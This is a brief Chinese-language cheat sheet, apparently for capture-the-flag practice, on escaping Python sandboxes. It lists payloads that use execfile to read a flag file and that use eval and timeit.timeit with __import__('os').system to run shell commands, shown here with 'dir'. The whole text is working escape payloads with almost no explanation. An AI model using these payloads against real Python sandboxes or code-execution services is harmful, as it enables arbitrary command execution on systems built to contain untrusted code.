# *python 沙箱逃逸*
```
py2: execfile('D:\\flag')		__import__('xxx')找到库的位置，用execfile加载它
py3 没有execfile
```
>timeit:

import timeit
timeit.timeit("__import__('os').system('dir')",number=1)

>eval:
eval('__import__("os").system("dir")')